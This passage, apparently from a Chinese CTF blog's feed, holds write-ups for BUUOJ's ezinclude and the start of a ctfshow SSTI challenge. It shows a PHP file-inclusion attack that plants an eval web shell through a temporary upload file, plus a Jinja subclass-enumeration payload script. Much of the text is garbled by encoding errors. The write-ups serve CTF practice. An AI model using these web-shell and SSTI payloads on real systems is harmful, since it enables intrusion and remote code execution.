„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦è‡è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“‡æ“¦å“©è‡çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“‡æ“¦å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“‡æ“¦è‡è‡å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡è‡å“©å“‡æ“¦å“©å“‡æ“¦çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©è‡å“©å“‡æ“¦å“©çµæ„Ÿè‡ğŸ„çµæ„Ÿè‡ğŸ„è‡è‡è‡è‡è‡è‡è‡è‡å“©å“©å“©å“‡æ“¦å“‡æ“¦çµæ„Ÿè‡ğŸ„&quot;</span><br><span class="line">å¤„ç†ç»“æœï¼š</span><br><span class="line">NSSCTF&#123;88dd8af0-3efe-4d6c-9d92-f2a1fb25b72a&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web&quot;&gt;#&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&quot;litctf-2025easy_file&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#litct</summary>
      
    
    
    
    <category term="CTFerçš„æ¯”èµ›ä¹‹è·¯" scheme="http://blog.g01den.top/categories/Game/"/>
    
    
    <category term="Game" scheme="http://blog.g01den.top/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>æœ‰å°è€ƒç‚¹çš„Webé¢˜</title>
    <link href="http://blog.g01den.top/posts/b3ad4123.html"/>
    <id>http://blog.g01den.top/posts/b3ad4123.html</id>
    <published>2025-10-27T14:38:34.000Z</published>
    <updated>2025-10-27T14:45:48.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="buuoj-npuctf2020ezinclude-1"><a class="markdownIt-Anchor" href="#buuoj-npuctf2020ezinclude-1">#</a> BUUOJ-[NPUCTF2020]ezinclude 1</h1><h2 id="æ¶‰åŠçš„çŸ¥è¯†ç‚¹"><a class="markdownIt-Anchor" href="#æ¶‰åŠçš„çŸ¥è¯†ç‚¹">#</a> æ¶‰åŠçš„çŸ¥è¯†ç‚¹</h2><ul><li>æ–‡ä»¶ä¸Šä¼ æ—¶çš„ä¸´æ—¶æ–‡ä»¶</li><li>php7 æ–‡ä»¶ä¸Šä¼ æ—¶  <code>Segment Fault</code> ï¼Œä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤</li><li>ç»•è¿‡ <code>disable_functions</code></li></ul><h2 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹">#</a> è§£é¢˜è¿‡ç¨‹</h2><p>â€‹æ‰«ä¸ªç›®å½•ï¼Œå­˜åœ¨ <code>index.php</code> ã€ <code>dir.php</code> ã€ <code>404.html</code></p><p>â€‹ <code>404.html</code>  æ²¡å•¥ç”¨ï¼Œå…ˆçœ‹ <code>dir.php</code> ï¼Œå¥½åƒè·å–ç›®å½•å†…æ–‡ä»¶çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåœ°æ–¹çš„ï¼Œä¹‹åçœ‹çœ‹ã€‚</p><p>â€‹ <code>index.php</code>  æŠ“ä¸ªåŒ…ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:20:37 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>73</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a; expires=Mon, 08-Dec-2025 06:20:37 GMT; Max-Age=3600000</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">username/password<span class="built_in"> error</span><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xquery"></span></span><br></pre></td></tr></table></figure><p>â€‹çœ‹åˆ° <code>&lt;!--md5($secret.$name)===$pass --&gt;</code>  æç¤º</p><blockquote><ul><li><code>Set-Cookie</code>  ä¸­çš„ <code>Hash</code>  å°±æ˜¯ <code>$md5($secret.$name)</code> ï¼ˆç»å…¸è„‘æ´ï¼‰</li><li>å¦‚æœ <code>$name=''</code> ï¼Œåˆ™æœ‰ <code>$md5($secret.$name)===$md5($secret)===ä¸Šé¢çš„Hash</code></li><li>åˆ™ <code>/?pass=ä¸Šé¢çš„Hash</code>  å³å¯ï¼Œæˆ–è€…å¸¦ä¸Š <code>&amp;name=</code>  ä¼ é€’ç©ºå€¼</li></ul></blockquote><p>â€‹è¿™é‡Œæ˜¯ä¸ªè„‘æ´ï¼Œä¸çŸ¥é“æ€ä¹ˆå†™ï¼Œå¤§ç¥çš„åšå®¢é‡Œçš„è§£æ³•æ˜¯è¿™æ ·çš„ï¼Œä¹‹åè®¿é—® get ä¼ å‚ pass ä¸º hash çš„å€¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?pass=fa25e54758d5d5c1927781a6ede89f8a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ab02601-d4bd-4e33-94da-895a0ac553e6.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¾—åˆ°å›æ˜¾ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:23:02 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>165</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;flflflflag.php&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>â€‹è®¿é—® <code>flflflflag.php</code> ï¼Œä¼š 302ï¼Œbutp é‡æ”¾ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 27 Oct 2025 14:24:50 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>241</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.0.33</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">include($_GET[&quot;file&quot;])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>â€‹æç¤ºæ–‡ä»¶åŒ…å«ï¼Œè¯»ä¸‹ç›¸å…³æ–‡ä»¶ <code>index.php</code> ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_Ã¥Â‡ÂºÃ©Â¢Â˜Ã¤ÂºÂº_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$file=$_GET[&#x27;file&#x27;];</span></span><br><span class="line"><span class="meta">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span></span><br><span class="line"><span class="meta">die(&#x27;nonono&#x27;);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">@include($file);</span></span><br><span class="line"><span class="meta">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹å‘ç° dataï¼Œinputï¼Œzip ä¸‰ä¸ªä¼ªåè®®è¢«æ¨äº†ã€‚</p><p>â€‹è¯»ä¸€ä¸‹ <code>dir.php</code> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æ˜¯è¯»å–çš„ä¸´æ—¶æ–‡ä»¶ï¼Œä¹‹å‰è¯´è¿‡äº†ï¼Œ</p><blockquote><p>php7 æ–‡ä»¶ä¸Šä¼ æ—¶  <code>Segment Fault</code> ï¼Œä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤</p><p><strong>è¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªç‰¹æ€§</strong>ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œå¦‚æœå‡ºç° <code>Segment Fault</code> ï¼Œé‚£ä¹ˆä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚è¿™é‡Œçš„ä¸Šä¼ æ–‡ä»¶éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œä¸€èˆ¬è®¤ä¸ºï¼Œä¸Šä¼ æ–‡ä»¶éœ€è¦å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼Œä½†å®é™…ä¸Šï¼Œæ— è®ºæ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œåªè¦ HTTP è¯·æ±‚ä¸­å­˜åœ¨æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±ä¼šè¢«ä¿å­˜ä¸ºä¸´æ—¶æ–‡ä»¶ï¼Œå½“å‰ HTTP è¯·æ±‚å¤„ç†å®Œæˆåï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¼šè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ä½¿ <code>php</code>  é™·å…¥æ­»å¾ªç¯ç›´ï¼Œäº§ç”Ÿ <code>Segment Fault</code>  çš„æ–¹æ³•ï¼šï¼ˆå…·ä½“åŸç†æœªæ‰¾åˆ°ï¼Œå¦‚æœæœ‰å¤§ä½¬æ¸…æ¥šï¼Œè¯·å‘ŠçŸ¥ï¼Œæ„Ÿè°¢ã€‚ï¼‰</p><ul><li>ä½¿ç”¨</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=æ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li><p>ç‰ˆæœ¬è¦æ±‚ï¼š</p><ul><li><code>php7.0.0-7.1.2</code></li><li><code>php7.1.3-7.2.1</code></li><li><code>php7.2.2-7.2.8</code></li></ul></li><li><p>ä½¿ç”¨</p></li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=æ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li>ç‰ˆæœ¬è¦æ±‚ï¼š<ul><li><code>php&lt;=5.6.38</code></li><li><code>php7.0.0-7.0.32</code></li><li><code>php7.0.4-7.2.12</code></li></ul></li><li>å‡½æ•°è¦æ±‚<ul><li><code>file</code></li><li><code>file_get_contents</code></li><li><code>readfile</code></li></ul></li></ul></blockquote><p>â€‹è¿™ä¸ªæ—¶å€™ç›´æ¥ç”¨ä¸‹é¢è¿™ä¸ªä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f5a7ab3-e7a9-44aa-82ec-fc6ee05919ff.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">file_data = &#123;<span class="string">&quot;file&quot;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">res = requests.post(url=url,files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><blockquote><ul><li>å­˜å‚¨è·¯å¾„ï¼Œç”±</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.ini</span><br></pre></td></tr></table></figure><p>ä¸­çš„</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_tmp_dir</span><br></pre></td></tr></table></figure><p>æŒ‡å®šï¼Œ</p><ul><li><p>linux ä¸‹é»˜è®¤å€¼ <code>/tmp/</code></p></li><li><p>windwos ä¸‹é»˜è®¤å€¼ <code>C:/Windwos</code>  or  <code>C:/Windwos/Temp/</code></p></li><li><p>å‘½åè§„åˆ™</p></li><li><p>linux ä¸‹ï¼Œ <code>php+6ä¸ªéšæœºå­—ç¬¦</code></p></li><li><p>windows ä¸‹ï¼Œ <code>php+4ä¸ªéšæœºå­—ç¬¦.tmp</code></p></li><li><p>ç”Ÿå‘½å‘¨æœŸ</p></li><li><p>å¼€å§‹å¤„ç†å¸¦æœ‰æ–‡ä»¶çš„ <code>POST</code>  è¯·æ±‚</p></li><li><p>ä¿å­˜ä¸´æ—¶æ–‡ä»¶ï¼Œå¹¶å†™å…¥æ•°æ®</p></li><li><p>æ‰§è¡Œ <code>php</code>  è„šæœ¬</p></li><li><p>åˆ é™¤ä¸´æ—¶æ–‡ä»¶</p></li></ul></blockquote><p>â€‹è¿™é‡Œå¯ä»¥ç›´æ¥è®¿é—® <code>dir.php</code>  è·å¾—æ–‡ä»¶åã€‚</p><p>â€‹ä¹‹åé€šè¿‡ flflflflag.php è¿›è¡Œä¸´æ—¶æ–‡ä»¶åŒ…å«å³å¯ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flflflflag.php?file=../../../tmp/php7nXFiI</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ab02601-d4bd-4e33-94da-895a0ac553e6.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>14</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">cmd</span><span class="operator">=</span>phpinfo()<span class="comment">;</span></span></span><br></pre></td></tr></table></figure><p>â€‹flag åœ¨ phpinfo é‡Œã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;buuoj-npuctf2020ezinclude-1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#buuoj-npuctf2020ezinclude-1&quot;&gt;#&lt;/a&gt; BUUOJ-[NPUCTF2020]ezinclude 1&lt;/h</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-SSTI</title>
    <link href="http://blog.g01den.top/posts/4826d2ce.html"/>
    <id>http://blog.g01den.top/posts/4826d2ce.html</id>
    <published>2025-05-03T15:19:26.000Z</published>
    <updated>2025-05-03T15:39:38.752Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web361"><a class="markdownIt-Anchor" href="#web361">#</a> web361ï¼š</h1><p>â€‹name ä¼ å‚ï¼Œç›´æ¥å¹²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_wrap</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">        url = <span class="string">&quot;http://a96b5242-08d2-4901-8692-4b324f00d95a.challenge.ctf.show/?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">        resp = get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;Enter your command: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span 